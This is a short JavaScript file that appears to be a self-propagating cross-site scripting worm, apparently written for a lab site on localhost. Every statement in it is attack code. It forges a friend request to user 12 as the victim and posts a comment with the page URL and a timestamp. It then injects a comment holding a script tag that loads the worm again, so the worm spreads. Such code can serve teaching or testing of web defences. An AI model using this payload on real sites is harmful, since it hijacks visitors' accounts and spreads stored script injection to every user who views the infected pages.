var friendme = new XMLHttpRequest(); 
friendme.open('POST', 'http://localhost/add_friend.php?id=12', true);
friendme.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); 
friendme.send();

var postinfo = new XMLHttpRequest();
wormlocation = window.location.href;
var today = new Date();
var date = today.getFullYear()+'-'+(today.getMonth()+1)+'-'+today.getDate();
var time = today.getHours() + ":" + today.getMinutes() + ":" + today.getSeconds();
var dateTime = date+' '+time;
postinfo.open('POST', 'http://localhost/add_comment.php?id=12&comment='+wormlocation+dateTime, true);
postinfo.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
postinfo.send();

var postworm= new XMLHttpRequest();
postworm.open('POST', 'http://localhost/add_comment.php?comment=\'<script src="test.js"></script>\'', true);
postworm.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
postworm.send();